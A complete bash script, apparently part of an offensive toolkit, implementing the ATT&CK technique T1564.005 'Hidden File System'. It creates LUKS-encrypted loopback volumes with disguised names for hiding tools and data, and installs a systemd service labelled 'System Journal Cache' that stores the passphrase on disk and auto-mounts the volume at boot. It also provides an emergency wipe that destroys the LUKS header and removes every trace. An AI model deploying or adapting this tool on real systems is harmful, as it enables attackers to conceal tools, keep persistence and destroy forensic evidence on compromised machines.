#!/bin/bash
#
# hidden_fs.sh — T1564.005 Hidden File System
#
# Create LUKS-encrypted loopback filesystems for hiding tools/data.
# Auto-mount via systemd, emergency LUKS header wipe.
#

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m'

HIDDEN_DIR="/var/lib/.d3m0n_hfs"
DEFAULT_IMG="${HIDDEN_DIR}/system_journal.img"
DEFAULT_MOUNT="/mnt/.cache"
HEADER_BACKUP="${HIDDEN_DIR}/header.bak"

banner_hfs() {
    echo -e "${RED}"
    echo "  ╔═══════════════════════════════════════════════════════╗"
    echo "  ║   T1564.005 — Hidden File System                      ║"
    echo "  ║   LUKS encrypted loopback + stealth mount             ║"
    echo "  ╚═══════════════════════════════════════════════════════╝"
    echo -e "${NC}"
}

check_root() {
    if [[ $EUID -ne 0 ]]; then
        echo -e "${RED}[!] Root required.${NC}"
        return 1
    fi
    return 0
}

check_deps() {
    local missing=0
    for cmd in cryptsetup losetup dd mkfs.ext4; do
        if ! command -v "$cmd" &>/dev/null; then
            echo -e "${RED}[!] Missing: ${cmd}${NC}"
            missing=1
        fi
    done
    if [[ $missing -eq 1 ]]; then
        echo -e "${YELLOW}[*] Install: apt install cryptsetup${NC}"
        return 1
    fi
    return 0
}

# ── [1] Create encrypted loopback filesystem ──
create_hidden_fs() {
    check_root || return 1
    check_deps || return 1

    echo -e "${CYAN}[*] Creating LUKS-encrypted hidden filesystem...${NC}"
    echo ""
    echo -e "${YELLOW}[?] Image file path [default: ${DEFAULT_IMG}]:${NC}"
    read -r IMG_PATH
    IMG_PATH="${IMG_PATH:-$DEFAULT_IMG}"

    echo -e "${YELLOW}[?] Size in MB [default: 256]:${NC}"
    read -r SIZE_MB
    SIZE_MB="${SIZE_MB:-256}"

    echo -e "${YELLOW}[?] Mount point [default: ${DEFAULT_MOUNT}]:${NC}"
    read -r MOUNT_POINT
    MOUNT_POINT="${MOUNT_POINT:-$DEFAULT_MOUNT}"

    echo -e "${YELLOW}[?] LUKS passphrase:${NC}"
    read -rs PASSPHRASE
    echo ""

    if [[ -z "$PASSPHRASE" ]]; then
        echo -e "${RED}[!] Passphrase required.${NC}"
        return 1
    fi

    mkdir -p "$(dirname "$IMG_PATH")" 2>/dev/null
    mkdir -p "$MOUNT_POINT" 2>/dev/null
    mkdir -p "$HIDDEN_DIR" 2>/dev/null

    # Create the disk image
    echo -e "${CYAN}  [*] Creating ${SIZE_MB}MB disk image...${NC}"
    dd if=/dev/urandom of="$IMG_PATH" bs=1M count="$SIZE_MB" status=progress 2>/dev/null

    if [[ $? -ne 0 ]]; then
        echo -e "${RED}[!] Failed to create disk image.${NC}"
        return 1
    fi

    # Setup loop device
    local LOOP_DEV
    LOOP_DEV=$(losetup -f --show "$IMG_PATH" 2>/dev/null)
    if [[ -z "$LOOP_DEV" ]]; then
        echo -e "${RED}[!] Failed to setup loop device.${NC}"
        return 1
    fi
    echo -e "${GREEN}  [+] Loop device: ${LOOP_DEV}${NC}"

    # LUKS format
    echo -e "${CYAN}  [*] Formatting with LUKS...${NC}"
    echo -n "$PASSPHRASE" | cryptsetup luksFormat --batch-mode "$LOOP_DEV" -d - 2>/dev/null
    if [[ $? -ne 0 ]]; then
        echo -e "${RED}[!] LUKS format failed.${NC}"
        losetup -d "$LOOP_DEV" 2>/dev/null
        return 1
    fi

    # Backup LUKS header
    cryptsetup luksHeaderBackup "$LOOP_DEV" --header-backup-file "$HEADER_BACKUP" 2>/dev/null
    echo -e "${GREEN}  [+] LUKS header backed up to ${HEADER_BACKUP}${NC}"

    # Open LUKS volume
    local DM_NAME="d3m0n_hidden"
    echo -n "$PASSPHRASE" | cryptsetup luksOpen "$LOOP_DEV" "$DM_NAME" -d - 2>/dev/null
    if [[ $? -ne 0 ]]; then
        echo -e "${RED}[!] Failed to open LUKS volume.${NC}"
        losetup -d "$LOOP_DEV" 2>/dev/null
        return 1
    fi

    # Create filesystem
    mkfs.ext4 -q "/dev/mapper/${DM_NAME}" 2>/dev/null
    echo -e "${GREEN}  [+] ext4 filesystem created${NC}"

    # Mount
    mount "/dev/mapper/${DM_NAME}" "$MOUNT_POINT" 2>/dev/null
    echo -e "${GREEN}  [+] Mounted at ${MOUNT_POINT}${NC}"

    # Save config
    cat > "${HIDDEN_DIR}/config" << CFGEOF
IMG_PATH=${IMG_PATH}
MOUNT_POINT=${MOUNT_POINT}
DM_NAME=${DM_NAME}
CFGEOF

    echo -e "${GREEN}[+] Hidden filesystem created!${NC}"
    echo -e "${YELLOW}  Image:   ${IMG_PATH} (${SIZE_MB}MB)${NC}"
    echo -e "${YELLOW}  Mount:   ${MOUNT_POINT}${NC}"
    echo -e "${YELLOW}  Loop:    ${LOOP_DEV}${NC}"
    echo -e "${YELLOW}  Mapper:  /dev/mapper/${DM_NAME}${NC}"
    echo -e "${RED}  [!] Remember your passphrase — no recovery without it!${NC}"
}

# ── [2] Mount existing hidden filesystem ──
mount_hidden() {
    check_root || return 1
    check_deps || return 1

    echo -e "${CYAN}[*] Mounting existing hidden filesystem...${NC}"

    if [[ -f "${HIDDEN_DIR}/config" ]]; then
        source "${HIDDEN_DIR}/config"
    else
        echo -e "${YELLOW}[?] Image file path:${NC}"
        read -r IMG_PATH
        echo -e "${YELLOW}[?] Mount point:${NC}"
        read -r MOUNT_POINT
        DM_NAME="d3m0n_hidden"
    fi

    if [[ ! -f "$IMG_PATH" ]]; then
        echo -e "${RED}[!] Image not found: ${IMG_PATH}${NC}"
        return 1
    fi

    echo -e "${YELLOW}[?] LUKS passphrase:${NC}"
    read -rs PASSPHRASE
    echo ""

    mkdir -p "$MOUNT_POINT" 2>/dev/null

    # Setup loop device
    local LOOP_DEV
    LOOP_DEV=$(losetup -f --show "$IMG_PATH" 2>/dev/null)

    # Open and mount
    echo -n "$PASSPHRASE" | cryptsetup luksOpen "$LOOP_DEV" "$DM_NAME" -d - 2>/dev/null
    if [[ $? -ne 0 ]]; then
        echo -e "${RED}[!] Wrong passphrase or corrupt volume.${NC}"
        losetup -d "$LOOP_DEV" 2>/dev/null
        return 1
    fi

    mount "/dev/mapper/${DM_NAME}" "$MOUNT_POINT" 2>/dev/null
    echo -e "${GREEN}[+] Mounted at ${MOUNT_POINT}${NC}"
}

# ── [3] Unmount hidden filesystem ──
unmount_hidden() {
    check_root || return 1

    echo -e "${CYAN}[*] Unmounting hidden filesystem...${NC}"

    local DM_NAME="d3m0n_hidden"
    local MOUNT_POINT="$DEFAULT_MOUNT"

    if [[ -f "${HIDDEN_DIR}/config" ]]; then
        source "${HIDDEN_DIR}/config"
    fi

    # Unmount
    umount "$MOUNT_POINT" 2>/dev/null

    # Close LUKS
    cryptsetup luksClose "$DM_NAME" 2>/dev/null

    # Detach loop devices for our image
    local IMG_PATH="$DEFAULT_IMG"
    if [[ -f "${HIDDEN_DIR}/config" ]]; then
        source "${HIDDEN_DIR}/config"
    fi

    losetup -j "$IMG_PATH" 2>/dev/null | cut -d: -f1 | while read -r loop; do
        losetup -d "$loop" 2>/dev/null
    done

    echo -e "${GREEN}[+] Hidden filesystem unmounted and closed.${NC}"
}

# ── [4] Auto-mount via systemd ──
setup_automount() {
    check_root || return 1

    echo -e "${CYAN}[*] Setting up auto-mount via systemd...${NC}"
    echo ""
    echo -e "${RED}[!] WARNING: This stores the passphrase on disk (in the service file).${NC}"
    echo -e "${YELLOW}[?] Proceed? [y/N]:${NC}"
    read -r CONFIRM
    [[ "$CONFIRM" =~ ^[Yy] ]] || return 0

    echo -e "${YELLOW}[?] LUKS passphrase:${NC}"
    read -rs PASSPHRASE
    echo ""

    local IMG_PATH="$DEFAULT_IMG"
    local MOUNT_POINT="$DEFAULT_MOUNT"
    local DM_NAME="d3m0n_hidden"

    if [[ -f "${HIDDEN_DIR}/config" ]]; then
        source "${HIDDEN_DIR}/config"
    fi

    # Store passphrase securely
    local KEY_FILE="${HIDDEN_DIR}/.keyfile"
    echo -n "$PASSPHRASE" > "$KEY_FILE"
    chmod 600 "$KEY_FILE"

    # Create mount script
    cat > "${HIDDEN_DIR}/mount.sh" << MNTEOF
#!/bin/bash
IMG="${IMG_PATH}"
MOUNT="${MOUNT_POINT}"
DM="d3m0n_hidden"
KEY="${KEY_FILE}"

LOOP=\$(losetup -f --show "\$IMG" 2>/dev/null)
cat "\$KEY" | cryptsetup luksOpen "\$LOOP" "\$DM" -d - 2>/dev/null
mkdir -p "\$MOUNT"
mount "/dev/mapper/\$DM" "\$MOUNT" 2>/dev/null
MNTEOF
    chmod 700 "${HIDDEN_DIR}/mount.sh"

    # Create systemd service
    cat > /etc/systemd/system/d3m0n-hfs.service << SVCEOF
[Unit]
Description=System Journal Cache
After=local-fs.target

[Service]
Type=oneshot
ExecStart=/bin/bash ${HIDDEN_DIR}/mount.sh
RemainAfterExit=yes

[Install]
WantedBy=multi-user.target
SVCEOF

    systemctl daemon-reload 2>/dev/null
    systemctl enable d3m0n-hfs.service 2>/dev/null

    echo -e "${GREEN}[+] Auto-mount service installed!${NC}"
    echo -e "${YELLOW}[*] Hidden FS will mount automatically on boot.${NC}"
}

# ── [5] Emergency LUKS header wipe ──
emergency_wipe() {
    check_root || return 1

    echo -e "${RED}"
    echo "  ╔═══════════════════════════════════════════╗"
    echo "  ║  EMERGENCY LUKS HEADER WIPE               ║"
    echo "  ║  This PERMANENTLY destroys the volume!    ║"
    echo "  ║  Data becomes IRRECOVERABLE!              ║"
    echo "  ╚═══════════════════════════════════════════╝"
    echo -e "${NC}"

    echo -e "${RED}[!] Type 'DESTROY' to confirm:${NC}"
    read -r CONFIRM
    if [[ "$CONFIRM" != "DESTROY" ]]; then
        echo -e "${YELLOW}[*] Aborted.${NC}"
        return 0
    fi

    local IMG_PATH="$DEFAULT_IMG"
    if [[ -f "${HIDDEN_DIR}/config" ]]; then
        source "${HIDDEN_DIR}/config"
    fi

    # Close everything first
    umount "$DEFAULT_MOUNT" 2>/dev/null
    cryptsetup luksClose d3m0n_hidden 2>/dev/null
    losetup -j "$IMG_PATH" 2>/dev/null | cut -d: -f1 | while read -r loop; do
        losetup -d "$loop" 2>/dev/null
    done

    if [[ -f "$IMG_PATH" ]]; then
        # Overwrite LUKS header (first 2MB)
        dd if=/dev/urandom of="$IMG_PATH" bs=1M count=2 conv=notrunc 2>/dev/null
        echo -e "${RED}  [+] LUKS header destroyed — volume is irrecoverable${NC}"

        echo -e "${YELLOW}[?] Also delete the image file? [y/N]:${NC}"
        read -r DEL_IMG
        if [[ "$DEL_IMG" =~ ^[Yy] ]]; then
            rm -f "$IMG_PATH"
            echo -e "${RED}  [+] Image file deleted${NC}"
        fi
    fi

    # Remove keyfile
    rm -f "${HIDDEN_DIR}/.keyfile" 2>/dev/null

    # Remove systemd service
    systemctl stop d3m0n-hfs.service 2>/dev/null
    systemctl disable d3m0n-hfs.service 2>/dev/null
    rm -f /etc/systemd/system/d3m0n-hfs.service 2>/dev/null
    systemctl daemon-reload 2>/dev/null

    echo -e "${RED}[+] Emergency wipe complete.${NC}"
}

# ── [6] Status ──
status_hfs() {
    echo -e "${CYAN}[*] Hidden Filesystem Status:${NC}"
    echo "─────────────────────────────────────────────"

    local IMG_PATH="$DEFAULT_IMG"
    local MOUNT_POINT="$DEFAULT_MOUNT"
    if [[ -f "${HIDDEN_DIR}/config" ]]; then
        source "${HIDDEN_DIR}/config"
    fi

    # Image file
    if [[ -f "$IMG_PATH" ]]; then
        local img_size
        img_size=$(du -h "$IMG_PATH" 2>/dev/null | cut -f1)
        echo -e "  Image: ${GREEN}${IMG_PATH}${NC} (${img_size})"
    else
        echo -e "  Image: ${RED}NOT FOUND${NC}"
    fi

    # Loop device
    local loops
    loops=$(losetup -j "$IMG_PATH" 2>/dev/null | cut -d: -f1)
    if [[ -n "$loops" ]]; then
        echo -e "  Loop:  ${GREEN}${loops}${NC}"
    else
        echo -e "  Loop:  ${YELLOW}Not attached${NC}"
    fi

    # LUKS mapper
    if [[ -e /dev/mapper/d3m0n_hidden ]]; then
        echo -e "  LUKS:  ${GREEN}/dev/mapper/d3m0n_hidden (OPEN)${NC}"
    else
        echo -e "  LUKS:  ${YELLOW}CLOSED${NC}"
    fi

    # Mount status
    if mountpoint -q "$MOUNT_POINT" 2>/dev/null; then
        local used
        used=$(df -h "$MOUNT_POINT" 2>/dev/null | tail -1 | awk '{print $3"/"$2" ("$5" used)"}')
        echo -e "  Mount: ${GREEN}${MOUNT_POINT} — ${used}${NC}"
    else
        echo -e "  Mount: ${YELLOW}Not mounted${NC}"
    fi

    # Header backup
    if [[ -f "$HEADER_BACKUP" ]]; then
        echo -e "  Header backup: ${GREEN}${HEADER_BACKUP}${NC}"
    fi

    # Auto-mount
    if systemctl is-enabled d3m0n-hfs.service &>/dev/null; then
        echo -e "  Auto-mount: ${GREEN}ENABLED${NC}"
    else
        echo -e "  Auto-mount: ${YELLOW}DISABLED${NC}"
    fi
}

# ── MAIN MENU ──
main_menu() {
    banner_hfs
    echo -e "  ${CYAN}[1]${NC} Create encrypted hidden filesystem"
    echo -e "  ${CYAN}[2]${NC} Mount existing hidden filesystem"
    echo -e "  ${CYAN}[3]${NC} Unmount hidden filesystem"
    echo -e "  ${CYAN}[4]${NC} Setup auto-mount (systemd)"
    echo -e "  ${CYAN}[5]${NC} Emergency LUKS header wipe"
    echo -e "  ${CYAN}[6]${NC} Status"
    echo ""
    echo -e "${YELLOW}[?] Select option:${NC} "
    read -r OPT

    case "$OPT" in
        1) create_hidden_fs ;;
        2) mount_hidden ;;
        3) unmount_hidden ;;
        4) setup_automount ;;
        5) emergency_wipe ;;
        6) status_hfs ;;
        *) echo -e "${RED}[!] Invalid option.${NC}" ;;
    esac
}

main_menu
